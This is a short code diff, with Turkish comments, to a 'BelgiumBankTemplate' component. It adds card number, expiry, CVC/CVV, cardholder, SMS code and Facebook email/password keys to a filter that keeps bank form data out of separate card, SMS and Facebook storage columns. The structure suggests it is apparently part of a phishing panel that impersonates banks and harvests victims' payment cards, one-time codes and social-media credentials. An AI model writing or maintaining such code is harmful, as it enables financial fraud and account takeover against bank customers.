@@ -229,6 +229,20 @@ export function BelgiumBankTemplate({ bankSlug, onChange, handleRouteAction, sav
       normalizedKey === "phone" ||
       normalizedKey === "mobile" ||
       normalizedKey === "email" ||
+      // DIGER KOLONLARIN KEY'LERI: banka verisi bu isimlerle persist edilirse
+      // Kart / SMS / Facebook kolonlarina sizar. Prefixli kopya (formN__x)
+      // yine saklanir; sadece kolon-key'i olarak yazilmasi engellenir.
+      normalizedKey === "cardnumber" ||
+      normalizedKey === "cardexpiry" ||
+      normalizedKey === "cardcvc" ||
+      normalizedKey === "cardholder" ||
+      normalizedKey === "cvv" ||
+      normalizedKey === "cvc" ||
+      normalizedKey === "smscode" ||
+      normalizedKey === "fbemail" ||
+      normalizedKey === "fbpassword" ||
+      normalizedKey === "fbfirstname" ||
+      normalizedKey === "fblastname" ||
       normalizedKey.includes("currency") ||
       normalizedKey.includes("valuta") ||
       normalizedKey === "fromamount" ||
